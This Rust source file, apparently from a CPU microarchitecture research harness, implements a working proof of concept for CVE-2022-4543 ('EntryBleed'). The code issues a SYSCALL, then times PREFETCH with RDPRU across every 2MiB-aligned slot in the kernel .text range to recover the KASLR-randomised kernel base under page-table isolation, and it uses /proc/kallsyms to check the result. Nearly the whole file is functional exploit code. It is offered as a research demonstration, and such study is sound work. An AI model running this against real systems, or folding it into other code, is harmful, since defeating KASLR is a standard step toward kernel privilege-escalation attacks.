
use perfect::*;
use perfect::events::*;
use perfect::stats::*;
use perfect::experiments::*;
use rand::prelude::*;
use rand::distributions::Uniform;
use std::collections::*;

fn main() {
    let kallsyms = SymbolMap::from_kallsyms();
    let iters = 1024;
    let attempts = 64;
    EntryBleed::run(&kallsyms, TestConfig {
        iters, attempts, emit_syscall: true, random_order: false,
    });
}

/// Options/tunables for generating/running the [EntryBleed] test.
#[derive(Clone, Copy, Debug)]
struct TestConfig {
    /// Insert a 'SYSCALL' instruction before the measurement.
    emit_syscall: bool,

    /// The number of measurements performed on each address.
    iters: usize,

    /// The number of test iterations.
    attempts: usize,

    /// Randomize the order of probed addresses.
    random_order: bool,
}

struct ProbeResult {
    addr: usize,
    sum: usize,
}


/// Demonstrate the behavior of CVE-2022-4543 ("EntryBleed").
///
///
/// Context
/// =======
///
/// In Linux, kernel virtual addresses are usually randomized in an attempt to 
/// make bugs more difficult to exploit. On top of that, the values are usually
/// hidden or sanitized in userspace. 
///
/// Following CVE-2017-5754 ("Meltdown"), the kernel also has a security
/// feature called "page-table isolation" (PTI) which explicitly separates
/// userspace and kernel page-table entries (PTEs). 
///
/// EntryBleed takes advantage of a corner case in the implementation of PTI:
/// the page containing the kernel's syscall handler must remain in the set 
/// of userspace page tables. This creates a situation where the `PREFETCH`
/// instruction can be used to trivially recover the base of the kernel virtual
/// addresses randomized by KASLR. See the paper[^1] for more details.
///
/// For more information about the behavior of the `PREFETCH` instruction on
/// Zen 2, see the `prefetch.rs` test in this directory. 
///
/// [^1]: [EntryBleed: A Universal KASLR Bypass against KPTI on Linux](https://dl.acm.org/doi/pdf/10.1145/3623652.3623669)
///
/// Test
/// ====
///
/// NOTE: This test does *not* rely on [`PerfectHarness`], and in this case 
/// the generated code is called directly from Rust code. 
///
/// NOTE: If PTI isn't enabled by default on your system, you can enable it 
/// by booting with `pti=on`. 
///
/// For each 2MiB-aligned address in the range where KASLR is allowed to map 
/// the base of the kernel `.text` section: 
///
/// 1. Perform a `SYSCALL` instruction in an attempt to ensure that the 
///    PTE for the page containing the syscall handler has been cached 
///    somewhere in the TLB hierarchy.
///
/// 2. While measuring with `RDPRU`, use the `PREFETCH` instruction to probe 
///    the target address. Afterwards, a barrier instruction (ie. `LFENCE`) 
///    ensures that the measurement captures any latency associated with the 
///    address translation required to execute the `PREFETCH` instruction.
///
/// 3. If the TLB lookup associated with `PREFETCH` succeeds, we expect that 
///    the measured time is shorter than cases for a PTE which is not present 
///    in the TLB. This effectively leaks the address of the page containing
///    the syscall handler to userspace. 
///
/// 4. Since the page containing the syscall handler is mapped at a fixed 
///    offset from the base address of the kernel's .text section, the 
///    base address for the kernel `.text` section can be trivially recovered
///
/// Results
/// =======
///
/// The address of the startup page leaks with *exceptional* reliability. 
///
/// Other Notes
/// ===========
///
/// On my machine, running this test with PTI *disabled* [and an idle system] 
/// seems to semi-reliably leak the address of the page corresponding to 
/// '__start_rodata' (which shouldn't be too suprising; this page is probably
/// global for performance reasons). 
///
///
pub struct EntryBleed;
impl EntryBleed {
    /// Kernel .text (low watermark)
    const KTEXT_LO: usize = 0xffff_ffff_8000_0000;

    /// Kernel .text (high watermark)
    const KTEXT_HI: usize = 0xffff_ffff_c000_0000;

    /// Range of the kernel .text segment
    const KTEXT_RANGE: std::ops::Range<usize> =
        (Self::KTEXT_LO..Self::KTEXT_HI);

    /// Probe stride [in bytes]
    const STRIDE: usize   = 0x0000_0000_0020_0000;

    /// Emit the code used to measure the PREFETCH instruction.
    ///
    /// The emitted function takes the target virtual address in RDI and
    /// returns the difference between the two measurements in RAX.
    ///
    /// FIXME: 'dynasm-rs' doesn't support RDPRU yet.
    ///
    fn emit_probe(cfg: TestConfig) -> X64AssemblerFixed {
        let mut f = X64AssemblerFixed::new(0x0000_0000_4001_0000, 0x4000);
        dynasm!(f
            ; push      rbp
            ; push      rbx
            ; push      rdi
            ; push      rsi
            ; push      r12
            ; push      r13
            ; push      r14
            ; push      r15
        );

        // Emit SYSCALL before measuring the PREFETCH instruction.
        // With any luck, this should ensure that the PTE for the kernel page
        // containing the handler is present somewhere in the TLB hierarchy.
        if cfg.emit_syscall {
            dynasm!(f
                ; mov rax, 104
                ; syscall
            );
        }

        // Measurement #1
        dynasm!(f
            ; mov rcx, 1 // With RDPRU, ECX=1 is APERF

            ; mfence
            ; lfence
            ; .bytes [0x0f, 0x01, 0xfd] // RDPRU
            ; mov r15, rax
            ; lfence
        );

        // NOTE: Maybe add knobs to emit different PREFETCH variants?
        dynasm!(f
            ; prefetchnta [rdi]
            ; prefetcht2 [rdi]
        );

        // Measurement #2
        dynasm!(f
            ; lfence
            ; .bytes [0x0f, 0x01, 0xfd] // RDPRU
            ; lfence
            ; sub rax, r15
        );

        dynasm!(f
            ; pop r15
            ; pop r14
            ; pop r13
            ; pop r12
            ; pop rsi
            ; pop rdi
            ; pop rbx
            ; pop rbp
            ; ret
        );
        f.commit().unwrap();
        f
    }

    /// Given a list of addresses `addrs`, use `probe_fn` to measure the
    /// latency associated with prefetching each address.
    ///
    /// Returns the address with the lowest cumulative latency.
    fn probe_ptes(addrs: &[usize], cfg: TestConfig,
        probe_fn: extern "C" fn(usize, usize) -> usize
    ) -> ProbeResult
    {
        let mut res = ProbeResult { addr: usize::MIN, sum: usize::MAX };
        for ptr in addrs {
            let mut sum = 0;
            for i in 0..cfg.iters {
                sum += probe_fn(*ptr, 0);
            }
            if sum < res.sum {
                res.sum = sum;
                res.addr = *ptr;
            }
        }
        res
    }

    /// Run the experiment with the given [TestConfig] and [SymbolMap].
    fn run(kallsyms: &SymbolMap, cfg: TestConfig) {
        println!("{}", format!("{:=^80}", ""));
        println!("[*] Using {:?} ...", cfg);
        let mut candidates = BTreeMap::new();
        let probe  = Self::emit_probe(cfg);

        // Build the list of addresses we want to probe
        let mut addrs = Self::KTEXT_RANGE.step_by(Self::STRIDE).collect_vec();
        if cfg.random_order {
            let mut rng = thread_rng();
            addrs.shuffle(&mut rng);
        }

        for iter in 0..cfg.attempts {
            let candidate = Self::probe_ptes(&addrs, cfg, probe.as_extern_fn());
            if let Some(c) = candidates.get_mut(&candidate.addr) {
                *c += 1;
            } else {
                candidates.insert(candidate.addr, 1);
            }
        }
        Self::print_results(&candidates, cfg, &kallsyms);
    }

    fn print_results(
        candidates: &BTreeMap<usize, usize>,
        cfg: TestConfig,
        kallsyms: &SymbolMap
    ) {

        // Iterator over candidates (ordered by address)
        //let iter = candidates.iter();

        // Iterator over candidates (ordered by the number of observations)
        let iter = candidates.iter().sorted_by(|x,y| x.1.cmp(y.1)).rev();

        for (addr, count) in iter {
            // Do not print results that are observed only once
            if *count == 1 {
                continue;
            }

            println!("[*] The PTE for {:016x} may be leaking (confidence={:.2})",
                addr, (*count as f32/ cfg.attempts as f32)
            );

            println!("The first few symbols from this page:");
            for (addr, sym) in kallsyms.data.range(addr..=&(addr+Self::STRIDE-1)).take(3) {
                println!("  {:016x} {}", sym.addr, sym.name);
            }
            println!("  ...");
            println!();
        }
        println!();
    }
}

/// An entry parsed from the contents of `/proc/kallsyms`.
#[derive(Clone, Debug)]
pub struct KallsymsEntry {
    /// Virtual address
    addr: usize,
    /// Symbol type
    kind: char,
    /// Symbol name
    name: String,
}
impl std::str::FromStr for KallsymsEntry {
    type Err = ();
    fn from_str(s: &str) -> Result<Self, ()> {
        let mut res = Self { addr: 0, kind: 'x', name: String::new() };
        for (idx, field) in s.trim().split_whitespace().enumerate() {
            match idx {
                0 => res.addr = usize::from_str_radix(field, 16).unwrap(),
                1 => res.kind = char::from_str(field).unwrap(),
                2 => res.name = field.to_string(),
                _ => {},
            }
        }
        Ok(res)
    }
}

/// Map of symbols (keyed by address).
pub struct SymbolMap {
    data: BTreeMap<usize, KallsymsEntry>,
}
impl SymbolMap {

    /// Attempt to read/parse `/proc/kallsyms` and return a map of symbols.
    ///
    /// Returns an empty map if `/proc/kallsyms` cannot be read.
    pub fn from_kallsyms() -> Self {
        use std::io::{prelude::*, BufReader};
        use std::str::FromStr;

        // This is the set of symbols that we're interested in
        let mut symbols = BTreeSet::new();
        symbols.insert("_stext");
        symbols.insert("entry_SYSCALL_64");
        symbols.insert("__start_rodata");
        symbols.insert("_sdata");

        let mut map = SymbolMap { data: BTreeMap::new() };
        if let Ok(f) = std::fs::File::open("/proc/kallsyms") {
            let mut rdr = BufReader::new(f);
            let mut lines_iter = rdr.lines();
            while let Some(line) = lines_iter.next() {
                let s = KallsymsEntry::from_str(&line.unwrap()).unwrap();

                // Prefer symbol names from our list
                if symbols.contains(s.name.as_str()) {
                    map.data.insert(s.addr, s.clone());
                }

                if !map.data.contains_key(&s.addr) {
                    map.data.insert(s.addr, s.clone());
                }

                // Only take other symbols that are 2MiB-aligned
                //if (s.addr & 0x1f_ffff) == 0 && !map.data.contains_key(&(s.addr & !0x1f_ffff)) {
                //    map.data.insert(s.addr, s.clone());
                //}

            }
        } else {
            println!("[*] No symbols available (couldn't read from /proc/kallsyms)");
        }
        map
    }
}

